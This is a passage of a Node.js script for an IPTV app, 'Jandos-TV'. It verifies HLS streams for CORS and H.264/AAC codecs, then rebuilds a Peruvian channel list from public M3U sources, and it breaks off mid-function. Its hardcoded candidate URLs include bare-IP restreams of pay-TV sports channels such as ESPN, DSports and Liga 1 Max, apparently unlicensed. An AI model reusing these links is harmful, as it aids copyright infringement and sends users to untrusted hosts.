/**
 * clean-channels.js - Script de Limpieza y Verificación Profunda HLS + CORS para Jandos-TV
 * 
 * REGLAS DE ORO:
 * 1. "SI FUNCIONA, NO SE TOCA": Verifica primero las URLs existentes en canales-remotos.json.
 *    Si una señal sigue respondiendo con H.264+AAC válido, queda estrictamente conservada.
 *    Solo se buscan reemplazos para canales cuyas URLs estén 100% caídas.
 * 2. ANTI-COLISIÓN: Matcher estricto por tvg-id oficial y procedencia peruana garantizada,
 *    prohibiendo coincidencias parciales con canales extranjeros.
 * 3. PRESERVACIÓN DE SERIES 24/7: Mantiene intactos los canales 21 al 26 con sus episodios ordenados.
 * 4. ORGANIZACIÓN VIP:
 *    - Bloque 1: Nacionales Perú (01-12)
 *    - Bloque 2: Deportes (13-20)
 *    - Bloque 3: Series y Anime 24/7 (21-26)
 *    - Bloque 4: Cine y Cultura (27+)
 *    - Bloque 5: Dibujos y Animación
 *    - Bloque 6: Regionales del Perú
 */

const fs = require('fs');
const path = require('path');

const TIMEOUT_MS = 4000;
const OUTPUT_FILE = path.join(__dirname, 'canales-remotos.json');
const SERIES_CATALOGO_FILE = path.join(__dirname, 'series-catalogo.json');
const CORS_TEST_ORIGIN = 'http://localhost:3000';
const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36';

// Fuentes M3U oficiales y actualizadas
const M3U_SOURCES = [
    { url: 'https://iptv-org.github.io/iptv/countries/pe.m3u', tag: 'peru' },
    { url: 'https://raw.githubusercontent.com/Free-TV/IPTV/master/playlists/playlist_peru.m3u8', tag: 'freetv-pe' },
    { url: 'https://raw.githubusercontent.com/iptv-org/iptv/master/streams/pe.m3u', tag: 'pe-streams' },
    { url: 'https://iptv-org.github.io/iptv/languages/spa.m3u', tag: 'spanish' },
    { url: 'https://iptv-org.github.io/iptv/categories/sports.m3u', tag: 'sports' },
    { url: 'https://raw.githubusercontent.com/Free-TV/IPTV/master/playlists/playlist_sports.m3u', tag: 'freetv-sports' },
    { url: 'https://iptv-org.github.io/iptv/categories/animation.m3u', tag: 'animation' },
    { url: 'https://iptv-org.github.io/iptv/categories/kids.m3u', tag: 'kids' }
];

// 1. Bloque Maestro 1: Nacionales Perú (Fijos 01 - 12) con tvg-ids oficiales y nombres exactos
const BLOCK_1_NACIONALES = [
    {
        id: 1,
        name: 'Latina Televisión',
        category: 'NACIONALES',
        tvgIds: ['Latina.pe', 'LatinaTelevisión.pe', 'LatinaTelevision.pe', 'FrecuenciaLatina.pe'],
        exactNames: ['latina televisión', 'latina television', 'latina tv', 'latina hd', 'frecuencia latina', 'latina'],
        candidateUrls: [
            'http://190.93.224.42/LATINA/index.m3u8'
        ]
    },
    {
        id: 2,
        name: 'América Televisión',
        category: 'NACIONALES',
        tvgIds: ['AmericaTelevision.pe', 'AmericaTV.pe', 'Canal4.pe'],
        exactNames: ['américa televisión', 'america television', 'américa tv', 'america tv', 'canal 4', 'america hd', 'américa hd'],
        candidateUrls: [
            'https://live-bd1.tv360.bitel.com.pe/manifest/america/master_clean_source.m3u8',
            'https://live-bd1.tv360.bitel.com.pe/manifest/america/playlist_clean_source_720p.m3u8',
            'https://live-bd1.tv360.bitel.com.pe/manifest/america/playlist_clean_source_480p.m3u8',
            'http://45.171.108.253:8888/AMERICA/index.m3u8'
        ]
    },
    {
        id: 3,
        name: 'Panamericana TV',
        category: 'NACIONALES',
        tvgIds: ['PanamericanaTelevision.pe', 'PanamericanaTV.pe', 'Canal5.pe'],
        exactNames: ['panamericana tv', 'panamericana televisión', 'panamericana television', 'panamericana', 'canal 5'],
        candidateUrls: [
            'http://45.171.108.253:8888/PANAMERICANA/index.m3u8',
            'http://190.93.224.42/PANAMERICANA/index.m3u8'
        ]
    },
    {
        id: 4,
        name: 'TV Perú',
        category: 'NACIONALES',
        tvgIds: ['TVPeru.pe', 'Canal7.pe'],
        exactNames: ['tv perú', 'tv peru', 'tv perú hd', 'tv peru hd', 'canal 7 perú', 'canal 7 peru'],
        candidateUrls: [
            'http://190.93.224.42/TV-PERU/index.m3u8',
            'http://45.171.108.253:8888/TVPERU/index.m3u8'
        ]
    },
    {
        id: 5,
        name: 'ATV',
        category: 'NACIONALES',
        tvgIds: ['ATV.pe', 'AndinaDeTelevision.pe', 'Canal9.pe'],
        exactNames: ['atv', 'atv hd', 'atv perú', 'atv peru', 'andina de televisión'],
        candidateUrls: [
            'http://190.93.224.42/ATV/index.m3u8',
            'http://45.171.108.253:8888/ATV/index.m3u8'
        ]
    },
    {
        id: 6,
        name: 'ATV+',
        category: 'NACIONALES',
        tvgIds: ['ATVPlus.pe', 'ATVMas.pe'],
        exactNames: ['atv+', 'atv plus', 'atv mas', 'atv más', 'atv+ noticias'],
        candidateUrls: [
            'http://45.171.108.253:8888/ATV/index.m3u8',
            'http://190.93.224.42/ATV-SUR/index.m3u8',
            'http://190.93.224.42/ATV/index.m3u8'
        ]
    },
    {
        id: 7,
        name: 'TV Perú Noticias',
        category: 'NACIONALES',
        tvgIds: ['TVPeruNoticias.pe', 'Canal73.pe'],
        exactNames: ['tv perú noticias', 'tv peru noticias', 'perú noticias', '7.3', 'tv perú 7.3'],
        candidateUrls: [
            'http://190.93.224.42/TV-PERU-NOTICIAS/index.m3u8',
            'http://45.171.108.253:8888/TVPERUNOTICIAS/index.m3u8'
        ]
    },
    {
        id: 8,
        name: 'Willax TV',
        category: 'NACIONALES',
        tvgIds: ['WillaxTelevision.pe', 'WillaxTV.pe', 'Willax.pe'],
        exactNames: ['willax tv', 'willax televisión', 'willax television', 'willax'],
        candidateUrls: [
            'http://190.93.224.42/WILLAX/index.m3u8',
            'http://45.171.108.253:8888/WILLAX/index.m3u8'
        ]
    },
    {
        id: 9,
        name: 'Exitosa TV',
        category: 'NACIONALES',
        tvgIds: ['ExitosaTV.pe', 'Exitosa.pe'],
        exactNames: ['exitosa tv', 'exitosa televisión', 'exitosa television', 'exitosa'],
        candidateUrls: [
            'http://190.93.224.42/EXITOSA/index.m3u8',
            'http://45.171.108.253:8888/EXITOSA/index.m3u8'
        ]
    },
    {
        id: 10,
        name: 'Nativa TV',
        category: 'NACIONALES',
        tvgIds: ['NativaTV.pe', 'Nativa.pe'],
        exactNames: ['nativa tv', 'nativa televisión', 'nativa television', 'nativa'],
        candidateUrls: [
            'http://187.102.210.46/NATIVATV/index.m3u8',
            'https://live-evg7.tv360.bitel.com.pe/bitel/nativachanchamayoSRT/playlist.m3u8'
        ]
    },
    {
        id: 11,
        name: 'Congreso TV',
        category: 'NACIONALES',
        tvgIds: ['CanalDelCongreso.pe', 'CongresoTV.pe', 'JusticiaTV.pe'],
        exactNames: ['congreso tv', 'canal del congreso', 'justicia tv', 'justiciatv', 'congreso'],
        candidateUrls: [
            'http://190.93.224.42/JUSTICIA-TV/index.m3u8',
            'http://138.121.15.230:9002/CANAL-CONGRESO/index.m3u8'
        ]
    },
    {
        id: 12,
        name: 'Sol TV',
        category: 'NACIONALES',
        tvgIds: ['SolTV.pe'],
        exactNames: ['sol tv', 'sol tv perú', 'sol tv trujillo', 'soltv'],
        candidateUrls: [
            'https://cloudpro.servidoresdestream.com:8081/8010/index.m3u8',
            'https://cdn.streamhispanatv.net:3409/live/soltvlive.m3u8',
            'https://live-evg10.tv360.bitel.com.pe/bitel/36tvSRT/playlist.m3u8',
            'https://s.emisoras.tv:8081/girasoltv/index.m3u8'
        ]
    }
];

// 2. Bloque Maestro 2: Deportes (Fijos 13 - 20)
const BLOCK_2_DEPORTES = [
    {
        id: 13,
        name: 'L1 MAX (Liga 1 Max)',
        category: 'DEPORTES',
        keywords: ['liga 1 max', 'l1 max', 'l1 play', 'liga 1', 'liga1max', 'l1'],
        candidateUrls: [
            'https://cablered.iptvperu.tv:1936/cablered/liga1max.stream/playlist.m3u8',
            'http://190.93.224.42/LIGA-1-MAX/index.m3u8',
            'http://45.4.1.201:8000/play/a1ai/index.m3u8',
            'http://cdn2.ujjina.com:1935/iptvovacion1/liveovacion1tv/playlist.m3u8'
        ]
    },
    {
        id: 14,
        name: 'GOLPERU',
        category: 'DEPORTES',
        keywords: ['golperu', 'gol peru', 'gol-peru', 'gol_peru'],
        candidateUrls: [
            'http://190.93.224.42/GOLPERU/index.m3u8',
            'http://45.4.1.201:8000/play/a03e/index.m3u8',
            'https://cablered.iptvperu.tv:1936/cablered/golperu.stream/playlist.m3u8',
            'http://cdn2.ujjina.com:1935/iptvovacion1/liveovacion1tv/playlist.m3u8'
        ]
    },
    {
        id: 15,
        name: 'Movistar Deportes',
        category: 'DEPORTES',
        keywords: ['movistar deportes', 'movistardeportes', 'cmd'],
        candidateUrls: [
            'http://170.244.209.30:8000/play/a1i8/index.m3u8',
            'http://45.4.1.201:8000/play/a13e/index.m3u8',
            'http://195.178.110.110/movistar/index.m3u8',
            'http://190.93.224.42/RPP/index.m3u8'
        ]
    },
    {
        id: 16,
        name: 'ESPN',
        category: 'DEPORTES',
        keywords: ['espn latin america', 'espn hd', 'espn colombia', 'espn argentina', 'espn '],
        candidateUrls: [
            'https://barinaslive1.boldmss.com/ESPN/ESPN.isml/ESPN.m3u8',
            'http://190.61.47.54:8000/play/a004/index.m3u8'
        ]
    },
    {
        id: 17,
        name: 'ESPN 2',
        category: 'DEPORTES',
        keywords: ['espn 2', 'espn2'],
        candidateUrls: [
            'https://barinaslive1.boldmss.com/ESPN_2/ESPN_2.isml/ESPN_2.m3u8',
            'http://190.61.47.54:8000/play/a005/index.m3u8'
        ]
    },
    {
        id: 18,
        name: 'DSports (DirecTV)',
        category: 'DEPORTES',
        keywords: ['dsports', 'directv sports'],
        candidateUrls: [
            'http://38.187.7.252:8000/play/a03d/index.m3u8',
            'http://168.196.127.137:6001/play/a03d/index.m3u8',
            'http://45.170.130.224:8000/play/a03d/index.m3u8'
        ]
    },
    {
        id: 19,
        name: 'Claro Sports',
        category: 'DEPORTES',
        keywords: ['claro sports', 'clarosports'],
        candidateUrls: [
            'http://168.196.127.137:6001/play/a08r/index.m3u8',
            'https://clarosports-live.akamaized.net/hls/live/2004245/clarosports1/master.m3u8',
            'http://45.170.130.224:8000/play/a08r/index.m3u8'
        ]
    },
    {
        id: 20,
        name: 'TyC Sports / TUDN',
        category: 'DEPORTES',
        keywords: ['tyc sports', 'tyc', 'tudn'],
        candidateUrls: [
            'https://amg26268-amg26268c14-freelivesports-emea-10267.playouts.now.amagi.tv/ts-us-e2-n2/playlist/amg26268-sportsstudio-tycsports-freelivesportsemea/playlist.m3u8',
            'http://45.170.130.224:8000/play/a020/index.m3u8'
        ]
    }
];

// Helper para verificar cabeceras CORS
function isCorsAllowed(res) {
    const allowOrigin = res.headers.get('access-control-allow-origin');
    return allowOrigin === '*' || allowOrigin === CORS_TEST_ORIGIN;
}

/**
 * Puntuación de calidad de origen y estabilidad CDN:
 */
function getCdnScore(url) {
    if (!url || typeof url !== 'string') return 0;
    const lower = url.toLowerCase();
    let score = 0;

    if (lower.includes('bitel.com.pe') || lower.includes('tv360')) score += 100;
    else if (lower.includes('akamaized.net') || lower.includes('cloudfront.net')) score += 95;
    else if (lower.includes('rudo.video') || lower.includes('amagi.tv') || lower.includes('boldmss.com')) score += 90;
    else if (lower.includes('google.com') || lower.includes('dailymotion') || lower.includes('mux.com')) score += 85;
    else if (lower.includes('servidoresdestream') || lower.includes('streamhispanatv') || lower.includes('ujjina')) score += 80;
    else if (lower.includes('live') || lower.includes('cdn')) score += 70;

    if (lower.startsWith('https://')) score += 40;

    if (lower.match(/:\d{4,5}\/play\//)) score -= 50;
    if (lower.match(/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/)) score -= 30;

    return score;
}

/**
 * Analiza un búfer TS buscando códecs compatibles (H.264 + AAC)
 */
function inspectTsCodecs(buf) {
    if (!buf || buf.length < 188) {
        return { isTs: false, hasH264: false, hasAac: false, hasHevc: false, hasMpeg2: false, hasAc3: false };
    }

    let syncOffset = -1;
    for (let i = 0; i < 188 && i < buf.length; i++) {
        if (buf[i] === 0x47 && (i + 188 >= buf.length || buf[i + 188] === 0x47)) {
            syncOffset = i;
            break;
        }
    }

    if (syncOffset === -1) {
        return { isTs: false, hasH264: false, hasAac: false, hasHevc: false, hasMpeg2: false, hasAc3: false };
    }

    let pmtPid = null;
    let hasH264 = false;
    let hasAac = false;
    let hasHevc = false;
    let hasMpeg2 = false;
    let hasAc3 = false;

    for (let offset = syncOffset; offset + 188 <= buf.length; offset += 188) {
        const p = buf.subarray(offset, offset + 188);
        const pusi = (p[1] & 0x40) !== 0;
        const pid = ((p[1] & 0x1f) << 8) | p[2];
        const afc = (p[3] & 0x30) >> 4;

        let payloadStart = 4;
        if (afc === 2) continue;
        if (afc === 3) {
            const afl = p[4];
            payloadStart = 5 + afl;
        }
        if (payloadStart >= 188) continue;

        if (pid === 0) {
            let ptr = payloadStart;
            if (pusi) ptr += 1 + p[ptr];
            if (ptr + 8 < 188 && p[ptr] === 0x00) {
                const sectionLength = ((p[ptr + 1] & 0x0f) << 8) | p[ptr + 2];
                let pos = ptr + 8;
                const end = ptr + 3 + sectionLength - 4;
                while (pos + 4 <= end && pos + 4 <= 188) {
                    const progNum = (p[pos] << 8) | p[pos + 1];
                    const progPid = ((p[pos + 2] & 0x1f) << 8) | p[pos + 3];
                    if (progNum !== 0) {
                        pmtPid = progPid;
                    }
                    pos += 4;
                }
            }
        } else if (pmtPid !== null && pid === pmtPid) {
            let ptr = payloadStart;
            if (pusi) ptr += 1 + p[ptr];
            if (ptr + 12 < 188 && p[ptr] === 0x02) {
                const sectionLength = ((p[ptr + 1] & 0x0f) << 8) | p[ptr + 2];
                const progInfoLength = ((p[ptr + 10] & 0x0f) << 8) | p[ptr + 11];
                let pos = ptr + 12 + progInfoLength;
                const end = ptr + 3 + sectionLength - 4;
                while (pos + 5 <= end && pos + 5 <= 188) {
                    const stype = p[pos];
                    const esInfoLen = ((p[pos + 3] & 0x0f) << 8) | p[pos + 4];

                    if (stype === 0x1b) hasH264 = true;
                    else if (stype === 0x24) hasHevc = true;
                    else if (stype === 0x01 || stype === 0x02) hasMpeg2 = true;
                    else if (stype === 0x0f || stype === 0x11) hasAac = true;
                    else if (stype === 0x81 || stype === 0x87) hasAc3 = true;

                    pos += 5 + esInfoLen;
                }
            }
        }
    }

    return { isTs: true, hasH264, hasAac, hasHevc, hasMpeg2, hasAc3 };
}

function checkManifestCodecs(manifestText) {
    const lines = manifestText.split(/\r?\n/).map(l => l.trim());
    let hasAvc1 = false;
    let hasMp4a = false;
    let hasHevc = false;
    let hasAc3 = false;
    let hasExplicitCodecs = false;

    for (const l of lines) {
        if (l.startsWith('#EXT-X-STREAM-INF') || l.startsWith('#EXT-X-MEDIA:TYPE=AUDIO')) {
            const match = l.match(/CODECS="([^"]+)"/i);
            if (match) {
                hasExplicitCodecs = true;
                const cStr = match[1].toLowerCase();
                if (cStr.includes('avc1') || cStr.includes('h264')) hasAvc1 = true;
                if (cStr.includes('mp4a') || cStr.includes('aac')) hasMp4a = true;
                if (cStr.includes('hev1') || cStr.includes('hvc1')) hasHevc = true;
                if (cStr.includes('ac-3') || cStr.includes('ec-3') || cStr.includes('ac3')) hasAc3 = true;
            }
        }
    }

    return { hasExplicitCodecs, hasAvc1, hasMp4a, hasHevc, hasAc3 };
}

/**
 * Verificación profunda HLS + CORS
 */
async function testHlsDeep(url, timeoutMs = TIMEOUT_MS) {
    if (!url || typeof url !== 'string' || !url.startsWith('http')) return false;

    // Si es un enlace directo a video .mp4 de series/archivo, probar con HEAD Range
    if (url.includes('.mp4')) {
        try {
            const res = await fetch(url, {
                method: 'HEAD',
                headers: { 'Range': 'bytes=0-1024', 'User-Agent': USER_AGENT },
                signal: AbortSignal.timeout(timeoutMs)
            });
            return res.status === 200 || res.status === 206;
        } catch (e) {
            return false;
        }
    }

    try {
        const res1 = await fetch(url, {
            headers: { 'Origin': CORS_TEST_ORIGIN, 'User-Agent': USER_AGENT },
            signal: AbortSignal.timeout(timeoutMs)
        });

        if (!res1.ok) return false;
        if (!isCorsAllowed(res1)) return false;

        const text1 = await res1.text();
        if (!text1.includes('#EXTM3U')) return false;

        const mCodecs = checkManifestCodecs(text1);
        if (mCodecs.hasExplicitCodecs) {
            if ((mCodecs.hasHevc || mCodecs.hasAc3) && !(mCodecs.hasAvc1 && mCodecs.hasMp4a)) {
                return false;
            }
        }

        let mediaPlaylistUrl = url;
        let mediaPlaylistText = text1;

        if (text1.includes('#EXT-X-STREAM-INF')) {
            const lines = text1.split(/\r?\n/).map(l => l.trim());
            let subPath = null;
            for (let i = 0; i < lines.length; i++) {
                if (lines[i].startsWith('#EXT-X-STREAM-INF')) {
                    const lLower = lines[i].toLowerCase();
                    if (lLower.includes('hev') || lLower.includes('hvc') || lLower.includes('ac-3')) {
                        continue;
                    }
                    for (let j = i + 1; j < lines.length; j++) {
                        const nextLine = lines[j];
                        if (nextLine && !nextLine.startsWith('#')) {
                            subPath = nextLine;
                            break;
                        }
                    }
                    if (subPath) break;
                }
            }

            if (!subPath) {
                for (let i = 0; i < lines.length; i++) {
                    if (lines[i].startsWith('#EXT-X-STREAM-INF')) {
                        for (let j = i + 1; j < lines.length; j++) {
                            const nextLine = lines[j];
                            if (nextLine && !nextLine.startsWith('#')) {
                                subPath = nextLine;
                                break;
                            }
                        }
                        if (subPath) break;
                    }
                }
            }

            if (!subPath) return false;
            mediaPlaylistUrl = subPath.startsWith('http') ? subPath : new URL(subPath, url).href;

            const res2 = await fetch(mediaPlaylistUrl, {
                headers: { 'Origin': CORS_TEST_ORIGIN, 'User-Agent': USER_AGENT },
                signal: AbortSignal.timeout(timeoutMs)
            });

            if (!res2.ok) return false;
            if (!isCorsAllowed(res2)) return false;

            mediaPlaylistText = await res2.text();
            if (!mediaPlaylistText.includes('#EXTM3U')) return false;
        }

        const mediaLines = mediaPlaylistText.split(/\r?\n/).map(l => l.trim());
        let segmentPath = null;

        for (let i = 0; i < mediaLines.length; i++) {
            if (mediaLines[i].startsWith('#EXTINF:')) {
                for (let j = i + 1; j < mediaLines.length; j++) {
                    const l = mediaLines[j];
                    if (l && !l.startsWith('#')) {
                        segmentPath = l;
                        break;
                    }
                }
                if (segmentPath) break;
            }
        }

        if (!segmentPath) {
            for (const l of mediaLines) {
                if (l && !l.startsWith('#') && (l.includes('.ts') || l.includes('.m4s') || l.includes('.mp4') || l.includes('.aac') || l.includes('segment') || l.includes('frag'))) {
                    segmentPath = l;
                    break;
                }
            }
        }

        if (!segmentPath) return false;

        const segmentUrl = segmentPath.startsWith('http') ? segmentPath : new URL(segmentPath, mediaPlaylistUrl).href;

        const res3 = await fetch(segmentUrl, {
            headers: {
                'Origin': CORS_TEST_ORIGIN,
                'User-Agent': USER_AGENT,
                'Range': 'bytes=0-16384'
            },
            signal: AbortSignal.timeout(timeoutMs)
        });

        if (!res3.ok && res3.status !== 206) return false;
        if (!isCorsAllowed(res3)) return false;

        const arrayBuf = await res3.arrayBuffer();
        if (arrayBuf.byteLength === 0) return false;

        const buf = Buffer.from(arrayBuf);
        const tsInfo = inspectTsCodecs(buf);

        if (tsInfo.isTs) {
            if (tsInfo.hasHevc) return false;
            if (tsInfo.hasMpeg2 && !tsInfo.hasH264) return false;
            if (tsInfo.hasAc3 && !tsInfo.hasAac) return false;
        }

        return true;
    } catch (e) {
        return false;
    }
}

// Descargar y parsear listas M3U con tvg-id y país
async function fetchM3U(source) {
    const url = typeof source === 'string' ? source : source.url;
    const tag = typeof source === 'object' ? source.tag : '';
    try {
        console.log(`[M3U] Descargando ${url}...`);
        const res = await fetch(url, { signal: AbortSignal.timeout(12000) });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const text = await res.text();
        const lines = text.split(/\r?\n/);
        const channels = [];
        let currentName = null;
        let currentTvgId = '';
        let currentCountry = '';

        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed) continue;
            if (trimmed.startsWith('#EXTINF:')) {
                const idMatch = trimmed.match(/tvg-id="([^"]*)"/i);
                currentTvgId = idMatch ? idMatch[1].trim() : '';

                const countryMatch = trimmed.match(/tvg-country="([^"]*)"/i);
                currentCountry = countryMatch ? countryMatch[1].trim() : '';

                const commaIdx = trimmed.lastIndexOf(',');
                currentName = commaIdx !== -1 ? trimmed.substring(commaIdx + 1).trim() : 'Canal';
            } else if (trimmed.startsWith('http://') || trimmed.startsWith('https://')) {
                if (currentName) {
                    channels.push({
                        name: currentName,
                        url: trimmed,
                        tag,
                        sourceUrl: url,
                        tvgId: currentTvgId,
                        country: currentCountry
                    });
                    currentName = null;
                    currentTvgId = '';
                    currentCountry = '';
                }
            }
        }
        console.log(`[M3U] ${channels.length} canales extraídos de ${url}`);
        return channels;
    } catch (err) {
        console.warn(`[M3U] Error descargando ${url}:`, err.message);
        return [];
    }
}

async function main() {
    console.log('=== JANDOS-TV: CURACIÓN INTELIGENTE ("SI FUNCIONA, NO SE TOCA") ===\n');

    // 1. Cargar canales-remotos.json existente
    let existingRemote = null;
    let existingChannels = [];
    if (fs.existsSync(OUTPUT_FILE)) {
        try {
            existingRemote = JSON.parse(fs.readFileSync(OUTPUT_FILE, 'utf-8'));
            existingChannels = existingRemote.channels || [];
            console.log(`Canales existentes cargados de ${OUTPUT_FILE}: ${existingChannels.length}`);
        } catch (e) {
            console.warn('No se pudo leer canales-remotos.json:', e.message);
        }
    }

    // 2. Extraer o cargar el bloque de SERIES Y ANIME para preservarlo intacto
    let preservedSeriesChannels = existingChannels.filter(c => c.category === 'SERIES Y ANIME');
    if (preservedSeriesChannels.length === 0 && fs.existsSync(SERIES_CATALOGO_FILE)) {
        try {
            const catData = JSON.parse(fs.readFileSync(SERIES_CATALOGO_FILE, 'utf-8'));
            if (catData && catData.series && catData.series.length > 0) {
                preservedSeriesChannels = catData.series.map((s, idx) => ({
                    id: 21 + idx,
                    name: s.name,
                    category: 'SERIES Y ANIME',
                    urls: s.urls || [],
                    episodes: s.episodes || []
                }));
                console.log(`Catálogo de series cargado de ${SERIES_CATALOGO_FILE}: ${preservedSeriesChannels.length} series.`);
            }
        } catch (e) {
            console.warn('No se pudo leer series-catalogo.json:', e.message);
        }
    }

    // 3. FASE "SI FUNCIONA, NO SE TOCA":
    // Verificar previamente todas las URLs de canales existentes
    console.log('\n--- FASE 1: VERIFICACIÓN DE SEÑALES ACTIVAS EXISTENTES ---');
    const existingWorkingMap = new Map(); // key: nombre en minúsculas -> array de urls vivas

    for (const exCh of existingChannels) {
        if (exCh.category === 'SERIES Y ANIME') continue; // Las series se preservan con sus episodios
        const chKey = exCh.name.toLowerCase().trim();
        const verifiedUrls = [];

        for (const u of (exCh.urls || [])) {
            const ok = await testHlsDeep(u);
            if (ok) {
                verifiedUrls.push(u);
            }
        }

        if (verifiedUrls.length > 0) {
            existingWorkingMap.set(chKey, verifiedUrls);
            console.log(`  ✓ [SI FUNCIONA, NO SE TOCA] ${exCh.name}: ${verifiedUrls.length} señal(es) activa(s) conservadas.`);
        } else {
            console.log(`  ✗ [REQUIERE REPARACIÓN] ${exCh.name}: todas sus señales cayeron.`);
        }
    }

    // 4. Descargar listas M3U en paralelo (solo necesarias para canales que requieran reparación o bloque cine/regional)
    console.log('\n--- FASE 2: DESCARGA DE FUENTES M3U PARA REPARACIONES Y CONTENIDO ---');
    const m3uResults = await Promise.all(M3U_SOURCES.map(s => fetchM3U(s)));
    const allRawChannels = m3uResults.flat();
    console.log(`Total canales en bruto disponibles: ${allRawChannels.length}`);

    // Matcher estricto anti-colisión para canales peruanos
    function findPeruvianCandidates(chDef) {
        const found = [];
        const targetTvgIds = (chDef.tvgIds || []).map(id => id.toLowerCase().trim());
        const exactNames = (chDef.exactNames || []).map(n => n.toLowerCase().trim());

        const foreignBlacklist = ['bolivia', 'argentina', 'chile', 'colombia', 'mexico', 'méxico', 'ecuador', 'uruguay', 'venezuela', 'jujuy', 'mendoza', 'santa fe'];

        for (const raw of allRawChannels) {
            const rawTvgId = (raw.tvgId || '').toLowerCase().trim();
            const rawName = (raw.name || '').toLowerCase().trim();
            const rawCountry = (raw.country || '').toLowerCase().trim();
            const isPeruSource = (raw.tag === 'peru' || raw.tag === 'freetv-pe' || raw.tag === 'pe-streams' ||
                (raw.sourceUrl && (raw.sourceUrl.includes('pe.m3u') || raw.sourceUrl.includes('playlist_peru'))) ||
                rawCountry === 'pe' || rawTvgId.endsWith('.pe'));

            // Descartar si el nombre contiene nombres de países o regiones extranjeras
            if (foreignBlacklist.some(b => rawName.includes(b))) {
                continue;
            }

            let matches = false;

            // 1. Coincidencia por tvg-id oficial
            if (rawTvgId && targetTvgIds.some(tid => rawTvgId === tid || rawTvgId === tid.replace('.pe', '') + '.pe')) {
                matches = true;
            }

            // 2. Coincidencia exacta de nombre (exclusivo para fuentes de Perú)
            if (!matches && isPeruSource && exactNames.some(en => rawName === en || rawName === en + ' hd')) {
                matches = true;
            }

            if (matches && !found.includes(raw.url)) {
                found.push(raw.url);
            }
        }
        return found;
    }

    // Helper general para búsqueda en deportes y animación
    function findExtraUrlsForKeywords(keywords) {
        const found = [];
        for (const raw of allRawChannels) {
            const rawName = (raw.name || '').toLowerCase().trim();
            if (keywords.some(kw => rawName.includes(kw.toLowerCase()))) {
                if (!found.includes(raw.url)) found.push(raw.url);
            }
        }
        return found;
    }

    // 5. Procesar Bloque 1: Nacionales Perú (Fijos 01 - 12)
    console.log('\n--- VERIFICANDO BLOQUE 1: NACIONALES PERÚ (01 - 12) ---');
    const finalNacionales = [];
    for (const ch of BLOCK_1_NACIONALES) {
        const chKey = ch.name.toLowerCase().trim();
        const existingWorking = existingWorkingMap.get(chKey);

        if (existingWorking && existingWorking.length > 0) {
            console.log(`Probando ${ch.name}... [CONSERVADO] (${existingWorking.length} señales operativas previas)`);
            finalNacionales.push({
                id: ch.id,
                name: ch.name,
                category: 'NACIONALES',
                urls: existingWorking
            });
            continue;
        }

        // Si cayó o no tenía señal operativa, buscar y verificar candidatos
        process.stdout.write(`Reparando ${ch.name}... `);
        const peruvianFound = findPeruvianCandidates(ch);
        const allCandidates = [...ch.candidateUrls, ...peruvianFound];
        const uniqueCandidates = [...new Set(allCandidates)].sort((a, b) => getCdnScore(b) - getCdnScore(a));
        const workingUrls = [];

        for (const u of uniqueCandidates) {
            const hasCdn = workingUrls.some(w => getCdnScore(w) >= 70);
            if (hasCdn && (u.includes(':8000/play/') || u.includes(':6001/play/'))) continue;

            const ok = await testHlsDeep(u);
            if (ok) {
                workingUrls.push(u);
                if (workingUrls.length >= 2) break;
            }
        }

        if (workingUrls.length === 0) {
            const sortedFallback = [...ch.candidateUrls].sort((a, b) => getCdnScore(b) - getCdnScore(a));
            workingUrls.push(sortedFallback[0]);
            console.log(`[FALLBACK ASIGNADO]`);
        } else {
            console.log(`[REPARADO CON ÉXITO] (${workingUrls.length} señales activas)`);
        }

        finalNacionales.push({
            id: ch.id,
            name: ch.name,
            category: 'NACIONALES',
            urls: workingUrls
        });
    }

    // 6. Procesar Bloque 2: Deportes (Fijos 13 - 20)
    console.log('\n--- VERIFICANDO BLOQUE 2: DEPORTES (13 - 20) ---');
    const finalDeportes = [];
    for (const ch of BLOCK_2_DEPORTES) {
        const chKey = ch.name.toLowerCase().trim();
        const existingWorking = existingWorkingMap.get(chKey);

        if (existingWorking && existingWorking.length > 0) {
            console.log(`Probando ${ch.name}... [CONSERVADO] (${existingWorking.length} señales operativas previas)`);
            finalDeportes.push({
                id: ch.id,
                name: ch.name,
                category: 'DEPORTES',
                urls: existingWorking
            });
            continue;
        }

        process.stdout.write(`Reparando ${ch.name}... `);
        const allCandidates = [...ch.candidateUrls, ...findExtraUrlsForKeywords(ch.keywords)];
        const uniqueCandidates = [...new Set(allCandidates)].sort((a, b) => getCdnScore(b) - getCdnScore(a));
        const workingUrls = [];

        for (const u of uniqueCandidates) {
            const hasCdn = workingUrls.some(w => getCdnScore(w) >= 70);
            if (hasCdn && (u.includes(':8000/play/') || u.includes(':6001/play/'))) continue;

            const ok = await testHlsDeep(u);
            if (ok) {
                workingUrls.push(u);
                if (workingUrls.length >= 2) break;
            }
        }

        if (workingUrls.length === 0) {
            workingUrls.push(ch.candidateUrls[0]);
            if (ch.candidateUrls.length > 1) workingUrls.push(ch.candidateUrls[ch.candidateUrls.length - 1]);
            console.log(`[FALLBACK ASIGNADO]`);
        } else {
            console.log(`[REPARADO CON ÉXITO] (${workingUrls.length} señales activas)`);
        }

        finalDeportes.push({
            id: ch.id,
            name: ch.name,
            category: 'DEPORTES',
            urls: workingUrls
        });
    }

    // 7. Bloque 3: Series y Anime 24/7 (Canales 21 al 26)
    console.log('\n--- BLOQUE 3: SERIES Y ANIME 24/7 (21 - 26) ---');
    const finalSeries = preservedSeriesChannels.slice(0, 6).map((s, idx) => ({
        id: 21 + idx,
        name: s.name,
        category: 'SERIES Y ANIME',
        urls: s.urls || [],
        episodes: s.episodes || []
    }));
    console.log(`  ✓ ${finalSeries.length} canales de Series y Anime preservados (21-26).`);

    // 8. Bloque 4: Cine y Cultura (Conservar existentes + agregar verificados)
    console.log('\n--- VERIFICANDO BLOQUE 4: CINE Y CULTURA (27+) ---');
    const existingCine = existingChannels.filter(c => c.category === 'CINE Y CULTURA');
    const verifiedCine = [];

    for (const c of existingCine) {
        const working = existingWorkingMap.get(c.name.toLowerCase().trim());
        if (working && working.length > 0) {
            verifiedCine.push({
                name: c.name,
                category: 'CINE Y CULTURA',
                urls: working
            });
        }
    }

    // Buscar señales adicionales de cine si hay menos de 10
    if (verifiedCine.length < 10) {
        const cineKeywords = ['cinecanal', 'cinelatino', 'cine familiar', 'cine hispano', 'cine sony', 'paramount', 'dhe', 'tnt', 'universal', 'star channel'];
